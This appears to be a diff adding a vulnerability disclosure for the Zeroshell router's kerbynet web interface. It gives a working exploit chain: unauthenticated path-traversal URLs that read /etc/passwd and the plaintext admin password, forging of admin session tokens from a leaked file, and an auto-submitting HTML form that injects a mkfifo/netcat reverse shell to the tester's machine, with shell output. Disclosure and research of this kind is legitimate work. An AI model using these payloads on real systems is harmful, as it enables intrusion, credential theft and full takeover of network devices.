@@ -1,0 +1,164 @@
+Introduction to the PoC :
+======================================================================
+
+In this distribution, the managment website is a binary file named "kerbynet" interpreted in cgi-bin directory here :
+
+/cdrom/usr/local/apache2/cgi-bin/kerbynet
+
+So all url look like this :
+
+http://www.example.com/cgi-bin/kerbynet?Section=<SECTION>&STk=<SESSION_TOKEN>&Action=<ACTION>&<PARAM>=<ADDITIONAL PARAM>
+
+This binary file routes the params (GET/POST) to dedicated script (mainly in sh) in the /root/kerbynet.cgi/scripts/ directory.
+There are also all templates html file located in /root/kerbynet.cgi/template/ directory.
+
+For all main administration action, the admin user need to be loggued (Unix account admin/zeroshell by default for console, SSH and WebGUI). A session token is needed through each administration page.
+
+There are few pages which can be requested without an authentification token like the GPL license, X.509 certificates, etc.
+
+The WebGUI running with the "apache" user. This user is restricted and can only run a white list of command and all script sh linked to the kerbynet.
+To see the administratives rights of this user, cat the file :
+
+cat /root/kerbynet.cgi/template.cfg/sudoers
+
+Many of these scripts can be exploited to execute arbitrarly command in the system through the WebGUI. For the next part of this PoC, only one script is exploited to gain a full remote reverse shell.
+
+
+ 
+Proof of Concept 1 : Local File Disclosure
+======================================================================
+
+About's url is the following :
+http://www.example.com/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=About
+
+As we can see, this url doesn't need a token session to print the GPN license of the distribution. The license is located in the file :
+/root/kerbynet.cgi/template/About
+
+So we can deduce that this url can be used to a local file disclosure vulnerability.
+
+PoC :
+http://www.example.com/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd
+
+Results :
+root:x:0:0:root:/root:/bin/bash
+admin:x:0:0:root:/root:/root/kerbynet.cgi/scripts/localman
+apache:x:1000:100::/home/apache:
+nobody:x:1001:100::/home/nobody:
+sshd:x:50000:100::/home/sshd:/bin/false
+bin:x:1:1::/home/bin:
+quagga:x:0:100::/home/quagga:
+havp:x:50002:50002:HTTP AntiVirus Proxy:/home/havp:/bin/false
+
+ 
+ 
+Proof of Concept 2 : Generate a valid admin session token
+======================================================================
+ 
+As we said, all administration request need a valid session token named "STk".
+This variable is used in GET url as param, and in hidden input field of form too.
+The session ID looklike this : 
+
+STk=9c00c5f06808b45a89e858d1954088f118f188a7
+
+If we focus on the generation of the session ID in scripts, we can find:
+
+/root/kerbynet.cgi/scripts/net_showinterface:STk="`rand``cat /tmp/STk_Admin 2>/dev/null`"
+/root/kerbynet.cgi/scripts/qos_showinterface:STk="`rand``cat /tmp/STk_Admin 2>/dev/null`"
+/root/kerbynet.cgi/scripts/vpn_list:STk="`rand``cat /tmp/STk_Admin 2>/dev/null`"
+/root/kerbynet.cgi/scripts/net_list:STk="`rand``cat /tmp/STk_Admin 2>/dev/null`"
+/root/kerbynet.cgi/scripts/qos_list:STk="`rand``cat /tmp/STk_Admin 2>/dev/null`"
+/root/kerbynet.cgi/scripts/storage_netDB:STk="`rand``cat /tmp/STk_Admin 2>/dev/null`"
+
+The "rand" command compute a random number with 8 digits, and the next part of the session ID depends on the content of the file /tmp/STk_Admin.
+This file /tmp/STk_Admin, is only created if an admin was loggued. With the previous local file disclosure vulnerability, we can retrieve the content of this file easily.
+If the file doesn't exist, you have to wait that a legitimate administrator connect to the WebGUI.
+
+PoC :
+http://www.example.com/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../tmp/STk_Admin
+
+Result :
+6808b45a89e858d1954088f118f188a7
+
+This hash corresponds to the last 32 chars of the valid STk. So we can forge a valid arbitrarly admin session token from this hash prepended with 8 random digits:
+
+Valid admin session ID generated :
+133713376808b45a89e858d1954088f118f188a7
+
+This token can be injected into known urls to access without credentials to administration menus.
+After normal and legitimate login, the page printed is composed of frame. To get each menus pages, you can used these following urls :
+
+- Left menu
+http://www.example.com/cgi-bin/kerbynet?STk=<GENERATED_SESSION_ID>&Action=Render&Object=sx
+- Utilities menu
+http://www.example.com/cgi-bin/kerbynet?STk=<GENERATED_SESSION_ID>&Action=Render&Object=utilities_menu
+- Head menu (reboot/shutdown router)
+http://www.example.com/cgi-bin/kerbynet?STk=<GENERATED_SESSION_ID>&Action=Render&Object=head
+
+
+Proof of Concept 3 : Gain a full reverse-shell without any credentials
+======================================================================
+ 
+At this point, we consider that you have a valid admin session ID generated with the previous method.
+With this token, we can get a full reverse-shell on the distribution, without login.
+
+First, we put a netcat in listening mod on a dedicated port in the pentester machine :
+
+#>nc -l -vv -p [PENTESTER_PORT]
+
+Next, run the following script in your browser after repace [PENTESTER_IP], [PENTESTER_PORT], www.example.com and [GENERATED_SESSION_ID] with yours :
+
+<html>
+  <body>
+    <form name='x' action='http://www.example.com/cgi-bin/kerbynet' method='post'>
+      <input type='hidden' name='Action' value='Lookup' />
+      <input type='hidden' name='STk' value='[GENERATED_SESSION_ID]' />
+      <input type='hidden' name='Section' value='DNS' />
+      <input type='hidden' name='What' value='yanncam" localhost && rm -f /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2>&1|nc [PENTESTER_IP] [PENTESTER_PORT] > /tmp/x #' />
+      <input type='hidden' name='DNS' value='localhost' />
+    </form>
+    <script>document.forms['x'].submit();</script>
+  </body>
+</html>
+
+A full reverse-shell is gain in your netcat instance :
+
+listening on [any] 1337 ...
+192.168.0.75: inverse host lookup failed: h_errno 11004: NO_DATA
+connect to [192.168.0.2] from (UNKNOWN) [192.168.0.75] 41145: NO_DATA
+sh: no job control in this shell
+sh-2.05b$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+admin:x:0:0:root:/root:/root/kerbynet.cgi/scripts/localman
+apache:x:1000:100::/home/apache:
+nobody:x:1001:100::/home/nobody:
+sshd:x:50000:100::/home/sshd:/bin/false
+bin:x:1:1::/home/bin:
+quagga:x:0:100::/home/quagga:
+havp:x:50002:50002:HTTP AntiVirus Proxy:/home/havp:/bin/false
+
+Netcat is provided in the Zeroshell distribution, but without the available flag -c or -e. So the technic used to send the shell is with a fifo file specially created.
+To see more information about reverse-shell one-liner, refer to : http://www.asafety.fr/vuln-exploit-poc/pentesting-etablir-un-reverse-shell-en-une-ligne/ (in french).
+
+ * A demonstration video has been realised as PoC here : https://www.youtube.com/watch?v=fgbfVBr65e4
+
+
+
+Proof of Concept 4 : Retrieve admin password in plaintext
+======================================================================
+
+The script used to change the admin password through the WebGUI is located here :
+/root/kerbynet.cgi/scripts/cpw
+
+If the change password mode is to check the old password before, this line il executed in the script :
+if [ "$CPW" != "`cat $REGISTER/system/ldap/rootpw 2>/dev/null`" ] ; then
+
+So the current password is located in $REGISTER/system/ldap/rootpw, where "$REGISTER" has value "/var/register" (defined in /etc/kerbynet.conf).
+
+Consequently, with the local file disclosure vulnerability describe above, we can retrieve the admin password in plaintext without any authentification with this url :
+
+PoC :
+http://www.example.com/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../var/register/system/ldap/rootpw
+
+Result (by default) :
+zeroshell
+
